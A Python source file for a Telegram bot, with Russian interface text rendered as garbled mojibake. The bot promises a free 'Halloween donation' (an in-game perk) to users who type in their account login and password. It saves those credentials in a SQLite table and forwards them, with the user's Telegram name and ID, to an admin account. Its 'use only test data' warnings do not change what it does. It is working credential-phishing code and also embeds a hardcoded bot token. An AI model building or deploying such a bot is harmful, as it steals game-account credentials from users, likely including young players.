import logging
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
import sqlite3
from datetime import datetime, timedelta
import asyncio

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏
BOT_TOKEN = "8300222284:AAHt3oT-fxyls9-xv0CNjG4ucFp4Y3vLFmU"
ADMIN_ID = 8000395560 # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à ID –∞–¥–º–∏–Ω–∞
CHANNEL_USERNAME = "@pnixmcbe"  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ username –≤–∞—à–µ–≥–æ –∫–∞–Ω–∞–ª–∞
CREATOR_USERNAME = "@isnikson"  # –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ username —Å–æ–∑–¥–∞—Ç–µ–ª—è

# –°–æ—Å—Ç–æ—è–Ω–∏—è –¥–ª—è ConversationHandler
ENTER_LOGIN, ENTER_PASSWORD = range(2)

# –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ –±–∞–Ω–æ–≤
def init_db():
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    # –¢–∞–±–ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            last_name TEXT,
            message_count INTEGER DEFAULT 0,
            last_message_time TIMESTAMP,
            is_banned BOOLEAN DEFAULT FALSE,
            ban_until TIMESTAMP
        )
    ''')
    
    # –¢–∞–±–ª–∏—Ü–∞ –¥–ª—è –ª–æ–≥–æ–≤ –¥–æ–Ω–∞—Ç–æ–≤
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS donation_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT,
            login TEXT,
            password TEXT,
            timestamp TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö
init_db()

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–µ –∑–∞–±–∞–Ω–µ–Ω –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å
    if is_user_banned(user_id):
        await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return
    
    welcome_text = f"""
üëª –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ Halloween Donation Bot! üéÉ

üì¢ –ù–∞—à –∫–∞–Ω–∞–ª: {CHANNEL_USERNAME}
üë®‚Äçüíª –°–æ–∑–¥–∞—Ç–µ–ª—å: {CREATOR_USERNAME}

üíÄ –ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã–π Halloween –¥–æ–Ω–∞—Ç, –≤–∞–º –Ω—É–∂–Ω–æ –≤–≤–µ—Å—Ç–∏ –¥–∞–Ω–Ω—ã–µ –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞.

‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï: –í–≤–µ–¥–∏—Ç–µ —Ç–æ–ª—å–∫–æ —Ç–µ—Å—Ç–æ–≤—ã–µ/—Ñ–µ–π–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ!
"""
    
    keyboard = [
        [KeyboardButton("üéÉ –ü–æ–ª—É—á–∏—Ç—å Halloween –¥–æ–Ω–∞—Ç")],
        [KeyboardButton("üì¢ –ù–∞—à –∫–∞–Ω–∞–ª"), KeyboardButton("üë®‚Äçüíª –°–æ–∑–¥–∞—Ç–µ–ª—å")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)
    
    # –°–±—Ä–∞—Å—ã–≤–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –µ—Å–ª–∏ –±—ã–ª–æ
    if context.user_data.get('in_donation_process'):
        context.user_data.clear()

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    message_text = update.message.text
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –±–∞–Ω
    if is_user_banned(user_id):
        await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return
    
    # –ê–Ω—Ç–∏-—Å–ø–∞–º —Å–∏—Å—Ç–µ–º–∞
    if not update_antispam(user_id):
        await ban_user(user_id, "–°–ø–∞–º (–±–æ–ª–µ–µ 10 —Å–æ–æ–±—â–µ–Ω–∏–π –≤ –º–∏–Ω—É—Ç—É)")
        await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∑–∞ —Å–ø–∞–º!")
        await notify_admin(f"üö® –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–±–∞–Ω–µ–Ω –∑–∞ —Å–ø–∞–º:\n"
                          f"ID: {user_id}\n"
                          f"Username: @{user.username if user.username else 'N/A'}\n"
                          f"–ò–º—è: {user.first_name}")
        return
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–æ–∫
    if message_text == "üéÉ –ü–æ–ª—É—á–∏—Ç—å Halloween –¥–æ–Ω–∞—Ç":
        await start_donation(update, context)
    elif message_text == "üì¢ –ù–∞—à –∫–∞–Ω–∞–ª":
        await update.message.reply_text(f"üì¢ –ü–æ–¥–ø–∏—Å—ã–≤–∞–π—Ç–µ—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª: {CHANNEL_USERNAME}")
    elif message_text == "üë®‚Äçüíª –°–æ–∑–¥–∞—Ç–µ–ª—å":
        await update.message.reply_text(f"üë®‚Äçüíª –ù–∞—à —Å–æ–∑–¥–∞—Ç–µ–ª—å: {CREATOR_USERNAME}")
    else:
        await update.message.reply_text("ü§î –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –¥–ª—è –Ω–∞–≤–∏–≥–∞—Ü–∏–∏!")

async def start_donation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if is_user_banned(user_id):
        await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return
    
    await update.message.reply_text(
        "üéÉ –î–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è Halloween –¥–æ–Ω–∞—Ç–∞ –≤–≤–µ–¥–∏—Ç–µ –ª–æ–≥–∏–Ω –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:\n"
        "‚ö†Ô∏è –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ —Ç–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ!"
    )
    return ENTER_LOGIN

async def enter_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if is_user_banned(user_id):
        await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return ConversationHandler.END
    
    login = update.message.text
    context.user_data['login'] = login
    context.user_data['in_donation_process'] = True
    
    await update.message.reply_text(
        "üîê –¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å:\n"
        "‚ö†Ô∏è –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ —Ç–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ!"
    )
    return ENTER_PASSWORD

async def enter_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    if is_user_banned(user_id):
        await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∏ –Ω–µ –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–æ—Ç–∞.")
        return ConversationHandler.END
    
    password = update.message.text
    login = context.user_data.get('login')
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
    save_donation_log(user_id, user.username, login, password)
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω—É
    admin_message = (
        "üéÉ –ù–û–í–´–ô HALLOWEEN –î–û–ù–ê–¢! üéÉ\n"
        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{user.username if user.username else 'N/A'}\n"
        f"üÜî ID: {user_id}\n"
        f"üìõ –ò–º—è: {user.first_name}\n"
        f"üîë –õ–æ–≥–∏–Ω: {login}\n"
        f"üîí –ü–∞—Ä–æ–ª—å: {password}\n"
        f"‚è∞ –í—Ä–µ–º—è: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    await notify_admin(admin_message)
    
    # –û—Ç–≤–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
    await update.message.reply_text(
        "üéâ –°–ø–∞—Å–∏–±–æ! –í–∞—à–∏ –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã!\n"
        "üëª Halloween –¥–æ–Ω–∞—Ç –±—É–¥–µ—Ç –∑–∞—á–∏—Å–ª–µ–Ω –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è!\n"
        "‚ö†Ô∏è –ü–æ–º–Ω–∏—Ç–µ: –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ —Ç–µ—Å—Ç–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ!"
    )
    
    # –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("‚ùå –ü—Ä–æ—Ü–µ—Å—Å –æ—Ç–º–µ–Ω–µ–Ω.")
    return ConversationHandler.END

# –ê–¥–º–∏–Ω –∫–æ–º–∞–Ω–¥—ã
async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /ban <user_id> [–ø—Ä–∏—á–∏–Ω–∞]")
        return
    
    try:
        user_id_to_ban = int(context.args[0])
        reason = " ".join(context.args[1:]) if len(context.args) > 1 else "–ù–µ —É–∫–∞–∑–∞–Ω–∞"
        
        await ban_user(user_id_to_ban, reason)
        await update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id_to_ban} –∑–∞–±–∞–Ω–µ–Ω.\n–ü—Ä–∏—á–∏–Ω–∞: {reason}")
        
    except ValueError:
        await update.message.reply_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç user_id")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /unban <user_id>")
        return
    
    try:
        user_id_to_unban = int(context.args[0])
        unban_user(user_id_to_unban)
        await update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id_to_unban} —Ä–∞–∑–±–∞–Ω–µ–Ω.")
        
    except ValueError:
        await update.message.reply_text("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç user_id")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("‚ùå –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
        return
    
    stats = get_bot_stats()
    await update.message.reply_text(
        f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–æ—Ç–∞:\n"
        f"üë• –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {stats['total_users']}\n"
        f"üéÉ –í—Å–µ–≥–æ –¥–æ–Ω–∞—Ç–æ–≤: {stats['total_donations']}\n"
        f"üö´ –ó–∞–±–∞–Ω–µ–Ω–æ: {stats['banned_users']}"
    )

# –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏
def update_antispam(user_id):
    """–û–±–Ω–æ–≤–ª—è–µ—Ç —Å—á–µ—Ç—á–∏–∫ —Å–æ–æ–±—â–µ–Ω–∏–π –∏ –ø—Ä–æ–≤–µ—Ä—è–µ—Ç –Ω–∞ —Å–ø–∞–º"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    now = datetime.now()
    
    # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–µ –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    cursor.execute('SELECT message_count, last_message_time FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if result:
        message_count, last_message_time = result
        last_message_time = datetime.fromisoformat(last_message_time) if last_message_time else now
        
        # –ï—Å–ª–∏ –ø—Ä–æ—à–ª–æ –±–æ–ª—å—à–µ –º–∏–Ω—É—Ç—ã - —Å–±—Ä–∞—Å—ã–≤–∞–µ–º —Å—á–µ—Ç—á–∏–∫
        if (now - last_message_time).total_seconds() > 60:
            message_count = 1
        else:
            message_count += 1
    else:
        message_count = 1
        # –°–æ–∑–¥–∞–µ–º –∑–∞–ø–∏—Å—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        cursor.execute(
            'INSERT OR REPLACE INTO users (user_id, message_count, last_message_time) VALUES (?, ?, ?)',
            (user_id, message_count, now.isoformat())
        )
    
    # –û–±–Ω–æ–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
    cursor.execute(
        'UPDATE users SET message_count = ?, last_message_time = ? WHERE user_id = ?',
        (message_count, now.isoformat(), user_id)
    )
    
    conn.commit()
    conn.close()
    
    return message_count <= 10  # –ú–∞–∫—Å–∏–º—É–º 10 —Å–æ–æ–±—â–µ–Ω–∏–π –≤ –º–∏–Ω—É—Ç—É

async def ban_user(user_id, reason):
    """–ë–∞–Ω–∏—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    ban_until = (datetime.now() + timedelta(days=30)).isoformat()  # –ë–∞–Ω –Ω–∞ 30 –¥–Ω–µ–π
    
    cursor.execute(
        'INSERT OR REPLACE INTO users (user_id, is_banned, ban_until) VALUES (?, ?, ?)',
        (user_id, True, ban_until)
    )
    
    conn.commit()
    conn.close()

def unban_user(user_id):
    """–†–∞–∑–±–∞–Ω–∏–≤–∞–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    cursor.execute(
        'UPDATE users SET is_banned = FALSE, ban_until = NULL WHERE user_id = ?',
        (user_id,)
    )
    
    conn.commit()
    conn.close()

def is_user_banned(user_id):
    """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∑–∞–±–∞–Ω–µ–Ω –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT is_banned, ban_until FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    conn.close()
    
    if result and result[0]:  # is_banned = True
        if result[1]:  # –ï—Å–ª–∏ –µ—Å—Ç—å –≤—Ä–µ–º—è –±–∞–Ω–∞
            ban_until = datetime.fromisoformat(result[1])
            if datetime.now() > ban_until:
                unban_user(user_id)  # –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ —Ä–∞–∑–±–∞–Ω–∏–≤–∞–µ–º –µ—Å–ª–∏ –≤—Ä–µ–º—è –≤—ã—à–ª–æ
                return False
        return True
    return False

def save_donation_log(user_id, username, login, password):
    """–°–æ—Ö—Ä–∞–Ω—è–µ—Ç –ª–æ–≥ –¥–æ–Ω–∞—Ç–∞"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    cursor.execute(
        'INSERT INTO donation_logs (user_id, username, login, password, timestamp) VALUES (?, ?, ?, ?, ?)',
        (user_id, username, login, password, datetime.now().isoformat())
    )
    
    conn.commit()
    conn.close()

def get_bot_stats():
    """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –±–æ—Ç–∞"""
    conn = sqlite3.connect('halloween_bot.db')
    cursor = conn.cursor()
    
    cursor.execute('SELECT COUNT(*) FROM users')
    total_users = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM donation_logs')
    total_donations = cursor.fetchone()[0]
    
    cursor.execute('SELECT COUNT(*) FROM users WHERE is_banned = TRUE')
    banned_users = cursor.fetchone()[0]
    
    conn.close()
    
    return {
        'total_users': total_users,
        'total_donations': total_donations,
        'banned_users': banned_users
    }

async def notify_admin(message):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –∞–¥–º–∏–Ω—É"""
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        await app.bot.send_message(ADMIN_ID, message)
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –∞–¥–º–∏–Ω—É: {e}")

def main():
    # –°–æ–∑–¥–∞–µ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ
    application = Application.builder().token(BOT_TOKEN).build()
    
    # ConversationHandler –¥–ª—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–æ–Ω–∞—Ç–∞
    donation_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex("üéÉ –ü–æ–ª—É—á–∏—Ç—å Halloween –¥–æ–Ω–∞—Ç"), start_donation)],
        states={
            ENTER_LOGIN: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_login)],
            ENTER_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_password)],
        },
        fallbacks=[CommandHandler("cancel", cancel)]
    )
    
    # –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
    application.add_handler(CommandHandler("start", start))
    application.add_handler(donation_conv_handler)
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
    print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω...")
    application.run_polling()

if __name__ == '__main__':
    main()